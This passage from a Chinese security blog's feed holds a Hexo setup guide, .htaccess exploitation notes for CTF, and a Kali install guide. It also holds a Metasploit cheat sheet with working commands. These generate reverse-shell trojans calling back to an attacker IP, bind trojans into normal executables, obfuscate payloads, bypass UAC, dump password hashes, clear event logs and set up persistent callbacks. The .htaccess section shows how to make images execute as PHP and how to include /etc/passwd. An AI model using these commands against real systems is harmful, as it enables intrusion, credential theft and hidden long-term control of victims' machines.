<p>tag中声明了私有标签名，和文章的同一密码，当文章需要加密的时候，为文章添加<code>private</code>标签即可</p>
<p>全局中可以声明多个密码和tag的组合，用来为不同类型的文章上锁</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Security</span><br><span class="line">encrypt: # hexo-blog-encrypt</span><br><span class="line">  silent: true</span><br><span class="line">  abstract: 这是一篇加密文章，需要密码才能继续阅读。</span><br><span class="line">  message: 当前文章暂不对外可见，请输入密码后查看！</span><br><span class="line">  tags:</span><br><span class="line">  - &#123;name: private, password: hello&#125;</span><br><span class="line">##- &#123;name: private2, password: passwd2&#125; </span><br><span class="line">  wrong_pass_message: 抱歉，您输入的密码错误，请检查后重新输入。</span><br><span class="line">  wrong_hash_message: 抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。</span><br></pre></td></tr></table></figure>

<h4 id="自定义密码"><a href="#自定义密码" class="headerlink" title="自定义密码"></a>自定义密码</h4><p>如果文章不想使用全局设置的密码，也可以为其设置自定义密码覆盖掉全局的密码设置，直接在文章中添加<code>tag</code>即可，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tags:</span><br><span class="line">- &#123;name: private, password: hello&#125;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tags:</span><br><span class="line">    - private</span><br><span class="line">password: &quot;hello&quot;</span><br></pre></td></tr></table></figure>

<h3 id="评论插件"><a href="#评论插件" class="headerlink" title="评论插件"></a>评论插件</h3><p>评论插件用的是<code>gitalk</code>，next已经内置了，只需要配置参数即可。</p>
<h4 id="注册github-OAuth-application"><a href="#注册github-OAuth-application" class="headerlink" title="注册github OAuth application"></a>注册github OAuth application</h4><p>访问<a href="https://github.com/settings/applications/new">https://github.com/settings/applications/new</a> ，相关信息按以下方法填写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Application name： # 应用名称，随意填写即可</span><br><span class="line">Homepage URL： # 你的网站地址，如https://yourname.github.io</span><br><span class="line">Application description # 描述，随意填写即可</span><br><span class="line">Authorization callback URL：# 你的网站地址，如https://yourname.github.io</span><br></pre></td></tr></table></figure>

<p>将NexT的<code>_config.yml</code>，拷贝到博客根目录，重命名为<code>_config.next.yml</code>然后再修改其内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gitalk:</span><br><span class="line">  enable: true # 此处改为true</span><br><span class="line">  github_id: yourname # 修改为的Github账户名，非邮箱地址</span><br><span class="line">  repo: yourname.github.io  # 修改为你的仓库名</span><br><span class="line">  client_id:  # 填入上一步中得到的Client ID</span><br><span class="line">  client_secret:  # 填入上一步中得到的Client Secret</span><br><span class="line">  admin_user: yourname # 修改为的Github账户名，非邮箱地址</span><br><span class="line">  proxy: https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token/</span><br><span class="line">  distraction_free_mode: false # 此处为false</span><br><span class="line">  # Gitalk&#x27;s display language depends on user&#x27;s browser or system environment</span><br><span class="line">  # If you want everyone visiting your site to see a uniform language, you can set a force language value</span><br><span class="line">  # Available values: en | es-ES | fr | ru | zh-CN | zh-TW</span><br><span class="line">  language: zh-CN #语言设为中文</span><br></pre></td></tr></table></figure>

<h2 id="hexo相关命令"><a href="#hexo相关命令" class="headerlink" title="hexo相关命令"></a>hexo相关命令</h2><p>生成静态文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo generate # 可以缩写为 hexo g</span><br></pre></td></tr></table></figure>

<p>部署网站</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo deploy # 可以简写为 hexo d</span><br></pre></td></tr></table></figure>

<p>启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo server</span><br><span class="line"># -p 指定端口</span><br><span class="line"># -s 只使用静态文件</span><br></pre></td></tr></table></figure>

<p>清除缓存和已经生成的静态文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>

<p>列出网站资料</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo list &lt;type&gt;</span><br></pre></td></tr></table></figure>

<p>安全模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo --safe # 不载入插件和脚本</span><br></pre></td></tr></table></figure>

<p>推荐使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
<h2 id="整站源码备份和恢复"><a href="#整站源码备份和恢复" class="headerlink" title="整站源码备份和恢复"></a>整站源码备份和恢复</h2><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><p>将整站源码上传至GitHub，记得删除主题目录下的<code>.git</code>文件，否则主题不会被上传，另外根目录下也有类似<code>.git</code>的文件会阻止部分源码上传，可以直接删除。</p>
<h3 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h3><p>git拉取下来之后需要安装<code>hexo-deployer-git</code>，删除<code>.deploy_git</code>文件夹后即可正常部署，否则无法部署</p>
<blockquote>
<p>npm install hexo-deployer-git –save</p>
</blockquote>
<p>另外如果配置了站点地图，迁移的时候同样需要重新安装</p>
<blockquote>
<p>npm install hexo-generator-sitemap –save</p>
</blockquote>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>blog搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>htaccess文件的深入学习</title>
    <url>/htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><code>.htaccess</code>允许用户在此目录及子目录中按照<code>.htaccess</code>配置文件中的规则来解析。</p>
<p><strong>需要注意的是</strong>：<code>.htaccess</code>中的配置会覆盖全局配置，另外如果子目录中也有<code>.htaccess</code>，其优先级会高于父目录，也就是会覆盖父目录中的规则。</p>
<p>管理员可以通过修改<code>apache</code>配置文件中的<code>AllowOverride</code>来<strong>开启</strong><code>.htaccess</code>的解析。</p>
<span id="more"></span>

<p><code>.htaccess</code> 中有 <code># </code>单行注释符, 且支持<code>\</code>拼接上下两行。</p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>启动<code>.htaccess</code></p>
<blockquote>
<p>AllowOverride All  #启动.htaccess文件的使用</p>
</blockquote>
<p>也可以将<code>.htaccess</code>修改为其他名</p>
<blockquote>
<p>AccessFileName .config #将.htaccess修改为.config</p>
</blockquote>
<h2 id="常见用途"><a href="#常见用途" class="headerlink" title="常见用途"></a>常见用途</h2><p><code>.htaccess</code>主要用途并不是给你日站，主要用来设置301重定向，自定义404错误页面，改变文件拓展名，允许&#x2F;阻止特定的用户或者目录的访问，配置默认文档等功能。</p>
<p>参考手册：<a href="http://www.htaccess-guide.com/">http://www.htaccess-guide.com/</a></p>
<h3 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h3><blockquote>
<p>SetHandler application&#x2F;x-httpd-php</p>
</blockquote>
<p>此时当前目录及其子目录下所有文件都会被当做 php 解析</p>
<blockquote>
<p>SetHandler server-status</p>
</blockquote>
<p>访问任意不存在的文件，加参数 ?refresh&#x3D;5 来实现每隔 5s 自动刷新监控性能</p>
<h3 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a>AddHandler</h3><blockquote>
<p>AddHandler cgi-script .xxx</p>
</blockquote>
<p>将扩展名为 .xxx 的文件作为 CGI 脚本来处理</p>
<h3 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h3><blockquote>
<p>AddType application&#x2F;x-httpd-php .gif</p>
</blockquote>
<p>将以 gif 为后缀的文件当做 php 解析</p>
<blockquote>
<p>AddType application&#x2F;x-httpd-php png  jpg gif</p>
</blockquote>
<p>将以 .png .jpg .gif 多个后缀当做 php 解析</p>
<h2 id="修改php-value"><a href="#修改php-value" class="headerlink" title="修改php_value"></a>修改php_value</h2><p><code>.htaccess</code>还可以修改个别的php的默认配置，可造成恶意解析、源码泄露、preg_match绕过等。</p>
<p>用法：</p>
<blockquote>
<p>php_value name value</p>
</blockquote>
<p>示例：</p>
<blockquote>
<p>php_value auto_prepend_file images.png</p>
</blockquote>
<p>访问一个 php 文件时，在该文件解析之前会先自动解析 images.png 文件。</p>
<blockquote>
<p>php_value pcre.backtrack_limit 0<br>php_value pcre.jit 0</p>
</blockquote>
<p>设置正则回朔次数来使正则匹配的结果返回为 false 而不是0 ，从而可以绕过正则。</p>
<blockquote>
<p>php_flag engine 0</p>
</blockquote>
<p>可以将 engine 设置为 0,在本目录和子目录中关闭 php 解析,造成源码泄露</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>将images.png 当做 PHP 执行</p>
<blockquote>
<p>&lt;FilesMatch  “images.png”&gt;<br>SetHandler  application&#x2F;x-httpd-php<br></p>
</blockquote>
<p>将 .jpg 当做 PHP 文件解析</p>
<blockquote>
<p>AddType application&#x2F;x-httpd-php .png</p>
</blockquote>
<p>文件包含</p>
<blockquote>
<p>通过 php_value 来设置 auto_prepend_file或者 auto_append_file 配置选项包含一些敏感文件, 同时在本目录或子目录中需要有可解析的 php 文件来触发。</p>
<p>.htaccess 分别通过这两个配置选项来包含 &#x2F;etc&#x2F;passwd,并访问同目录下的 index.php文件。</p>
<p>auto_prepend_file</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file /etc/passwd</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>auto_append_file</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file /etc/passwd</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="具体导航"><a href="#具体导航" class="headerlink" title="具体导航"></a>具体导航</h2><p><a href="https://xz.aliyun.com/t/8267">https://xz.aliyun.com/t/8267</a></p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ssrf</tag>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
  <entry>
    <title>hyperv安装kali及其相关应用</title>
    <url>/hyperv%E5%AE%89%E8%A3%85kali%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<p>hyperv中安装2022版kali以及相关配置的的详细教程</p>
<p><img src="/hyperv%E5%AE%89%E8%A3%85kali%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8/47ef4509e682cfb3a821c9c8fa42935e.png" alt="截图"></p>
<span id="more"></span>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装镜像推荐使用完全版live boot</p>
<blockquote>
<p><a href="https://www.kali.org/get-kali/#kali-live">https://www.kali.org/get-kali/#kali-live</a></p>
</blockquote>
<h3 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h3><p>经测试，只能通过快速创建进行安装，注意取消勾选<code>此虚拟机将运行windows</code></p>
<p>创建完成后再手动去移动磁盘位置</p>
<p>快速创建默认分配的空间是127g</p>
<p>然后再进行安装</p>
<p>安装过程中需要将<code>使用网络镜像</code>设置为<code>否</code></p>
<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><h4 id="黑屏问题"><a href="#黑屏问题" class="headerlink" title="黑屏问题"></a>黑屏问题</h4><p>如果出现黑屏(进入启动菜单后黑屏)，先点击<code>还原</code>按钮，然后点击<code>启动</code>按钮，接着再点击<code>重置</code>按钮即可正常进入启动页面，<strong>记得操作要连贯</strong>。</p>
<p><img src="/hyperv%E5%AE%89%E8%A3%85kali%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8/295b76c7d3260ac30596ec2ed12991bc.png" alt="截图"></p>
<h4 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a>安装问题</h4><p>安装过程中可能会报如下错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># GRUB安装失败</span><br><span class="line"></span><br><span class="line"># 无法将grub-pc软件包安装到/target/中，如果没有GRUB启动引导器，所安装的系统将无法启动。</span><br></pre></td></tr></table></figure>

<p>需要返回，然后选择<code>配置软件包管理器</code>，<code>使用网络镜像</code>设置为<code>否</code>，击继续，安装成功后，再去kali Linux操作系统下，安装“更新源”也是可以的。</p>
<p>如果还是不行，那就重新安装，记得不要选中网络镜像。</p>
<h2 id="附加内容"><a href="#附加内容" class="headerlink" title="附加内容"></a>附加内容</h2><h3 id="启动增强会话"><a href="#启动增强会话" class="headerlink" title="启动增强会话"></a>启动增强会话</h3><p>官方文档：</p>
<blockquote>
<p><a href="https://www.kali.org/docs/virtualization/install-hyper-v-guest-enhanced-session-mode/#changing-the-setting-of-the-virtual-machine">https://www.kali.org/docs/virtualization/install-hyper-v-guest-enhanced-session-mode/#changing-the-setting-of-the-virtual-machine</a></p>
</blockquote>
<p>kali中设置：</p>
<ol>
<li>输入命令<code>kali-tweaks</code></li>
<li>选择<code>Virtualization</code></li>
<li>选择<code>Configure the system for Hyper-V enhanced session mode</code></li>
</ol>
<p>windows中设置：</p>
<ol>
<li><p>powershell中输入</p>
<p> <code>Set-VM &quot;(YOUR VM NAME HERE)&quot; -EnhancedSessionTransportType HVSocket</code></p>
</li>
<li><p>然后关闭kali，重启真实机即可</p>
</li>
</ol>
<h3 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h3><blockquote>
<p>apt install fcitx fcitx-googlepinyin</p>
</blockquote>
<p>然后在左上角应用程序中搜索并打开<code>fcitx配置</code></p>
<p>然后再继续搜索并打开<code>fcitx</code></p>
<p>此时<code>fcitx配置</code>中新增了google拼音</p>
<p>根据个人情况设置快捷键</p>
<p>重启即可使用输入法</p>
<h4 id="我的设置"><a href="#我的设置" class="headerlink" title="我的设置"></a>我的设置</h4><p>我习惯使用shift来切换中英文输入。</p>
<p><img src="/hyperv%E5%AE%89%E8%A3%85kali%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8/92fff64dc8e61380bc3452b14c02c4fa.png" alt="截图"></p>
<h3 id="安装v2ray"><a href="#安装v2ray" class="headerlink" title="安装v2ray"></a>安装v2ray</h3><h4 id="安装Qv2ray"><a href="#安装Qv2ray" class="headerlink" title="安装Qv2ray"></a>安装Qv2ray</h4><p>Qv2ray是linux下的图形化版本的v2ray，虽然已经停止维护了，但是还是很好用的。</p>
<blockquote>
<p><a href="https://github.com/Qv2ray/Qv2ray">https://github.com/Qv2ray/Qv2ray</a></p>
</blockquote>
<p>下载后缀为<code>.appimage</code>版本的程序，放入kali中，然后命令行启动</p>
<p>注意不能以管理员权限启动，否则会闪退。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo chmod +x ./Qv2ray.appimage</span><br><span class="line">$ ./Qv2ray.appimage</span><br><span class="line"># 其实给过执行权限之后就可以双击启动了。</span><br><span class="line"># 启动之后右上角有图标显示</span><br></pre></td></tr></table></figure>

<p><img src="/hyperv%E5%AE%89%E8%A3%85kali%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8/67eeb8b5d2e03dedc4c408a8ed88aec1.png" alt="截图"></p>
<h4 id="安装内核"><a href="#安装内核" class="headerlink" title="安装内核"></a>安装内核</h4><p>安装v4版本的内核，Qv2ray对v5版本不兼容，因为老早就停止维护了。</p>
<blockquote>
<p><a href="https://github.com/v2fly/v2ray-core/tags">https://github.com/v2fly/v2ray-core/tags</a></p>
</blockquote>
<p>下载下来后解压到对应目录即可。</p>
<p><img src="/hyperv%E5%AE%89%E8%A3%85kali%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8/b997763949cca6195f0ae9350aef9d99.png" alt="截图"></p>
<p>解压完成后点击下方按钮检查内核，当出现正确提示后表示安装成功。</p>
<h3 id="关于字体大小设置"><a href="#关于字体大小设置" class="headerlink" title="关于字体大小设置"></a>关于字体大小设置</h3><blockquote>
<p><a href="https://blog.csdn.net/qq_42577128/article/details/123218271">https://blog.csdn.net/qq_42577128/article/details/123218271</a></p>
</blockquote>
<p>另外，qt5设置可以调整qt框架的字体大小，比如默认终端的菜单栏。</p>
]]></content>
      <categories>
        <category>虚拟化</category>
      </categories>
      <tags>
        <tag>虚拟化</tag>
        <tag>hyper-v</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>metasploit小结</title>
    <url>/metasploit%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<h2 id="meterpreter-shell常识"><a href="#meterpreter-shell常识" class="headerlink" title="meterpreter shell常识"></a>meterpreter shell常识</h2><blockquote>
<p>mefconsole启动时在哪个目录，下载下来的文件就在哪个目录，也可以通过lcd命令切换本地临时目录。</p>
<p>getuid：查看当前权限</p>
<p>edit命令：就是msf中的vim，<code>edit 文件</code></p>
<p>pgrep命令：从进程中筛选，并显示pid，比如pgrep notepad</p>
<span id="more"></span>

<p><img src="/metasploit%E5%B0%8F%E7%BB%93/52ffe035c7259ff3dcf5a59fe62ea06f.png" alt="截图"></p>
<p>kill和pkill命令：kill是根据pid杀死进程的，pkill是根据进程名杀死进程的，比如<code>pkill notepad</code></p>
<p>ps：列出所有进程，pid是当前进程id，ppid是父进程id</p>
<p>reg：操作注册表，自行百度</p>
<p>suspend <pid>：暂停一个进程，或者恢复一个进程(-r参数）</pid></p>
<p>windows shell中执行set：查看环境变量</p>
<p>idletime：空闲时间，用户多久没有使用这台pc了</p>
</blockquote>
<h3 id="生成木马："><a href="#生成木马：" class="headerlink" title="生成木马："></a>生成木马：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p 指定payload</span><br><span class="line">-a 指定x86或x64</span><br><span class="line">-o 指定输出位置</span><br><span class="line">-f 指定后缀 exe、bin啥的</span><br><span class="line">--platform 指定平台，windows、linux</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe -o ./muma.exe LHOST=193.122.122.123 LPORT=12345</span><br></pre></td></tr></table></figure>

<h4 id="将木马捆绑到1-exe-（-x和-k参数）"><a href="#将木马捆绑到1-exe-（-x和-k参数）" class="headerlink" title="将木马捆绑到1.exe （-x和-k参数）"></a>将木马捆绑到1.exe （-x和-k参数）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-x 参数指定一个正常文件</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows -x ./1.exe -o ./muma.exe </span><br></pre></td></tr></table></figure>

<blockquote>
<p>此外还有个-k参数，正常-x参数会寻找程序入口（EntryPoint），绑定在程序内部增加隐蔽性，当找不到入口时可以使用-k参数将木马捆绑，这种捆绑方式和原程序互不干扰，并行线程，保证了原始程序的正常使用，看起来很正常。</p>
</blockquote>
<h3 id="查看高级选项："><a href="#查看高级选项：" class="headerlink" title="查看高级选项："></a>查看高级选项：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show advanced</span><br></pre></td></tr></table></figure>

<h3 id="启动监听："><a href="#启动监听：" class="headerlink" title="启动监听："></a>启动监听：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/Handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 193.122.122.123</span><br><span class="line">set LPORT 12345</span><br><span class="line">set exitonsession false //监听到session不退出，也就是允许多个终端连接,show advanced中查看</span><br><span class="line">run  //可以添加-j参数，后台监听</span><br></pre></td></tr></table></figure>

<h3 id="msfconsole查看任务："><a href="#msfconsole查看任务：" class="headerlink" title="msfconsole查看任务："></a>msfconsole查看任务：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jobs //列出所有工作，比如run -j在后台运行会被列出</span><br><span class="line">kill //结束工作，kill &lt;序号&gt;</span><br></pre></td></tr></table></figure>

<h3 id="查看会话"><a href="#查看会话" class="headerlink" title="查看会话:"></a>查看会话:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessions -l //列出活动会话</span><br><span class="line">sessions -d //查看非活动会话</span><br><span class="line">sessions -k 1-20 //断开1-20的会话</span><br><span class="line">sessions -K //断开全部会话</span><br></pre></td></tr></table></figure>

<h3 id="meterpreter-shell常用命令："><a href="#meterpreter-shell常用命令：" class="headerlink" title="meterpreter shell常用命令："></a>meterpreter shell常用命令：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">help //查看命令</span><br><span class="line">getdesktop //进入桌面目录</span><br><span class="line">touch &lt;name&gt;//创建文件</span><br><span class="line">mkdir &lt;name&gt;//创建目录</span><br></pre></td></tr></table></figure>

<h3 id="msfconselo常用命令："><a href="#msfconselo常用命令：" class="headerlink" title="msfconselo常用命令："></a>msfconselo常用命令：</h3><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">msfconsole -q <span class="comment">//静默启动，不显示logo</span></span><br><span class="line">msfconsole -r &lt;filename.rc&gt; <span class="comment">//读取文件，并按行执行文件内容，后缀可以自定义，不用必须设置为rc</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">文件内容可以如下&lt;exp_mul_handler_x86.rc&gt;：</span></span><br><span class="line"><span class="comment">use exploit/multi/handler</span></span><br><span class="line"><span class="comment">set payload windows/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="comment">set lhost 193.122.122.123</span></span><br><span class="line"><span class="comment">set lport 12345</span></span><br><span class="line"><span class="comment">run</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">此时输入下面命令即可快速打开监听：</span></span><br><span class="line"><span class="comment">msfconsole -r exp_mul_handler_x86.rc</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="混淆器encoder-e"><a href="#混淆器encoder-e" class="headerlink" title="混淆器encoder (-e)"></a>混淆器encoder (-e)</h3><blockquote>
<p>可以使用<code>msfvenom -l encoder</code>命令查看全部混淆器，和品质</p>
<p>用-e参数指定混淆器，-i参数设置混淆次数</p>
<p>比如 <code>-e x86/shikata_ga_nai -i 10</code></p>
</blockquote>
<h3 id="hta后门"><a href="#hta后门" class="headerlink" title="hta后门"></a>hta后门</h3><blockquote>
<p>hta是html的一种格式，windows可以直接执行，msf生成的hta是调用powershell生成后门的。</p>
<p>使用<code>-f hta-psh</code>指定生成hta文件</p>
</blockquote>
<blockquote>
<p><img src="/metasploit%E5%B0%8F%E7%BB%93/04996ac27a482083311dbc1385c1a072.png" alt="截图"></p>
</blockquote>
<h3 id="系统操作"><a href="#系统操作" class="headerlink" title="系统操作"></a>系统操作</h3><blockquote>
<p>自带的提权：getsystem &#x2F;&#x2F;容易失败，可以使用exploit中专用的提权模块</p>
<p>降权：rev2self &#x2F;&#x2F;提权后可以降权</p>
<p>擦除入侵痕迹：clearev &#x2F;&#x2F;需要高权限</p>
</blockquote>
<h3 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h3><blockquote>
<p>getprivs：一般提权，权限提升不明显</p>
<p>getsystem： 尝试获取system权限</p>
<p><strong>bypassuac：</strong></p>
<p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</p>
<p>set session 1 &#x2F;&#x2F;哪个session需要提权</p>
<p>set payload &#x2F;&#x2F;默认payload是windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
<p>set lhost 193.122.122.123 &#x2F;&#x2F;ip</p>
<p>set lport 12345 &#x2F;&#x2F;端口</p>
<p>&#x2F;&#x2F;也可以使用payload exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr</p>
</blockquote>
<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><blockquote>
<p><code>hashdump</code>经测试，直接使用会报错，需要在meterpreter shell中运行下面的命令才行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/hashdump</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p><img src="/metasploit%E5%B0%8F%E7%BB%93/9ce6a5b07c03bd7a61689e4915fd669b.png" alt="截图"></p>
</blockquote>
<p><img src="/metasploit%E5%B0%8F%E7%BB%93/763ace5a47956ea0b9132a6152bb6cd7.png" alt="截图"></p>
<h2 id="网络相关："><a href="#网络相关：" class="headerlink" title="网络相关："></a>网络相关：</h2><blockquote>
<p>portfwd:</p>
</blockquote>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">portfwd：端口转发，代理出网，将受害者的端口转发到攻击机的端口（内网机器出网）</span><br><span class="line"></span><br><span class="line">比如将内网的<span class="number">3386</span>转发到vps的<span class="number">6666</span>端口：</span><br><span class="line">portfwd add -l <span class="number">6666</span> -r <span class="number">193.122</span><span class="number">.122</span><span class="number">.123</span> -p <span class="number">3389</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*命令行开启远程桌面</span></span><br><span class="line"><span class="comment">#设置远程桌面端口</span></span><br><span class="line"><span class="comment">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span></span><br><span class="line"><span class="comment">#开启远程桌面</span></span><br><span class="line"><span class="comment">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span></span><br><span class="line"><span class="comment">#检查端口状态</span></span><br><span class="line"><span class="comment">netstat -an|find &quot;3389&quot;</span></span><br><span class="line"><span class="comment">#关闭远程桌面</span></span><br><span class="line"><span class="comment">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">或者注册表</span></span><br><span class="line"><span class="comment">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span></span><br><span class="line"><span class="comment">将fEnableWinStation&quot;值由0改为1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">删除转发：</span><br><span class="line">portfwd <span class="built_in">delete</span> -l <span class="number">6666</span> -r <span class="number">193.122</span><span class="number">.122</span><span class="number">.123</span> -p <span class="number">3386</span></span><br><span class="line"></span><br><span class="line">portfwd list:显示所有转发</span><br></pre></td></tr></table></figure>

<h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><p>设置AutoRunScript，当meterpreter上线后自动执行持久化命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.2.101</span><br><span class="line">set LPORT 5555</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set AutoRunScript persistence -r 192.168.2.101 -p 5556 -U -X -i 30</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>

<blockquote>
<p>获取meterpreter shell后可以进行持久化</p>
<p>持久化之前要尽可能的提高权限（system）</p>
<p>因为要向system目录下写文件并设置自启</p>
<p>可以设置开机自启、定时回连等功能</p>
<p>在meterpreter shell中通过<code>run persistence -h</code>获取帮助文档</p>
<p><img src="/metasploit%E5%B0%8F%E7%BB%93/50930f0906c0ecca839401bb53a60a16.png" alt="截图"></p>
<p>常用参数：</p>
<p>-X：开机自启</p>
<p>-i <number>：每隔<number>秒会自动回连</number></number></p>
<p>-p <port>： 指定回连端口</port></p>
<p>-r <ip>：指定回连ip</ip></p>
<p>-S：作为服务启动</p>
<p>-U：用户登录时自启动</p>
<p>-P ：指定payload 默认 windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
</blockquote>
<h2 id="操作注册表reg"><a href="#操作注册表reg" class="headerlink" title="操作注册表reg"></a>操作注册表reg</h2><blockquote>
<p>获取到system权限后，或者administrator权限可以进入meterpreter shell操作注册表，命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\NetBT\\Parameters -v SMBDeviceEnabled -d 1</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="疑难杂症："><a href="#疑难杂症：" class="headerlink" title="疑难杂症："></a>疑难杂症：</h2><p>当出现下图这种情况时，一般是监听时payload没设置对。</p>
<p><img src="/metasploit%E5%B0%8F%E7%BB%93/47164f4367d0561b9f30fcc181c89cde.png" alt="截图"></p>
]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>metasploit生成木马</title>
    <url>/metasploit%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="生成跨平台脚本木马"><a href="#生成跨平台脚本木马" class="headerlink" title="生成跨平台脚本木马"></a>生成跨平台脚本木马</h2><p>我们知道了可以使用msfvenom生成木马，针对脚本语言比如python、ruby、php甚至powershell，需要选择对应的<code>payload</code>后使用<code>-f raw</code>指定使用源码生成，如下所示：</p>
<p>生成powershell后门，meterpreter上线</p>
